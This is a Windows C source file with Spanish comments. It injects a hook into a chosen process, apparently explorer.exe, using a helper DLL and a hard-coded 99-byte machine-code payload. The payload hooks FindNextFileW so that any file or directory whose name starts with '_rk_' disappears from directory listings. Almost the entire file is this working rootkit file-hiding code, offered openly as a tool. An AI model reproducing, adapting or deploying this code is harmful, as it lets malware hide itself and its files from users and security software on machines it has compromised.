#include <stdio.h>
#include <windows.h>

typedef struct _HOOK_
{
	//Pid del que obtener la función proxy
	unsigned int	PidOrigen;
	//Pid objetivo
	unsigned int    PidDestino;
	//Offset de la función proxy en la memoria del proceso ‘PidOrigen’
	DWORD           OffsetFProxy;
	//Tamaño de la función proxy
	DWORD           TamFProxy;
	//La función objetivo, ¿Es interna o externa?
	BOOL            FuncionInterna;
	//Indicamos la dirección en la memoria del
	//proceso objetivo en caso de ser interna
	DWORD           DireccionFInterna;
	//Si es externa, indicamos el nombre de la función
	const char      *Funcion;
	//Y la librería en la que se encuentra
	const char      *Libreria;
	//Número de bytes para realizar el hook
	DWORD           Bytes;
	//La dirección base de la librería kernel32.dll
	DWORD           BaseKernel;
	//Offset de la funcion ‘GetProcAddress’
	DWORD           OffsetGPA;
}Hook;

typedef struct _ERROR_HOOK_
{
	DWORD    Codigo;//Codigo de retorno
	char    *Mensaje;//Mensaje de la libreria (en caso de error)
	char    *MensajeSistema;//Mensaje del SO (en caso de error)
}*ERROR_HOOK;

typedef ERROR_HOOK(CHook)(_HOOK_);

/****************************************************************/
/** HOOK FindNextFileW PAYLOAD - OCULTA FICHEROS Y DIRECTORIOS **/
/**                    CON EL PREFIJO "_rk_"                   **/
/**============================================================**/
/**                       SIZE: 99 Bytes                       **/
/****************************************************************/
/*
Thanks to MazarD ;)

//ANSI Version
BOOL __stdcall FindNext(HANDLE hFindFile,LPWIN32_FIND_DATA lpFindFileData)
{
	BOOL (__stdcall *pBuffFN) (HANDLE hFindFile,LPWIN32_FIND_DATA lpFindFileData);
    void *p;

	p=0;

	pBuffFN=(BOOL (__stdcall*)(HANDLE,LPWIN32_FIND_DATA))p;
	return (pBuffFN)(hFindFile,lpFindFileData);
}*/
const static char payload[]=  "\x55\x89\xE5\x83\xEC\x18\xC7\x45\xF4\x00\x00\x00\x00"
                              "\x8B\x45\xF4\x89\x45\xFC\x8B\x45\x0C\x89\x44\x24\x04"
                              "\x8B\x45\x08\x89\x04\x24\x8B\x45\xFC\xFF\xD0\x83\xEC"
                              "\x08\x89\x45\xF8\x8B\x45\x0C\x66\x83\x78\x2C\x5F\x75"
                              "\x26\x8B\x45\x0C\x66\x83\x78\x32\x5F\x75\x1C\x8B\x45"
                              "\x0C\x66\x83\x78\x2E\x72\x75\x12\x8B\x45\x0C\x66\x83"
                              "\x78\x30\x6B\x75\x08\x83\x7D\xF8\x00\x74\x02\xEB\xB8"
                              "\x8B\x45\xF8\xC9\xC2\x08\x00";

int main()
{
	HMODULE     dll;
	FARPROC	    f,OffsetGPA;
	CHook	    *func;
	ERROR_HOOK  ret;
	Hook        datos;

 	dll=LoadLibrary("C:\\dll_hooking.dll");
	if(dll)
 	{
			f=GetProcAddress(dll,"HookMemory");
			datos.BaseKernel=(DWORD)GetModuleHandle("kernel32.dll");
			datos.OffsetGPA=(DWORD)GetProcAddress((HINSTANCE)datos.BaseKernel,"GetProcAddress");

			if ( f && datos.BaseKernel && datos.OffsetGPA )
            {
				// explorer.exe
				printf("PID: ");
				scanf("%d",&datos.PidDestino);

				datos.PidOrigen=GetCurrentProcessId();
				datos.FuncionInterna=FALSE;
				//datos.FuncionInterna=TRUE;
				//datos.DireccionFInterna=0x401290;
				datos.Funcion="FindNextFileW";
				datos.Libreria="kernel32.dll";
				datos.OffsetFProxy=(DWORD)payload;
				datos.TamFProxy=sizeof(payload);
				datos.Bytes=7;

				func=(CHook*)f;
				ret=func(datos);

				if(ret->Codigo==0)
					puts("OK");
				else
					printf("\nError: %d\nDescripcion: %s\nSistema: %s",	ret->Codigo,ret->Mensaje,ret->MensajeSistema);
            }
	}

	system("pause");
	return 0;
}
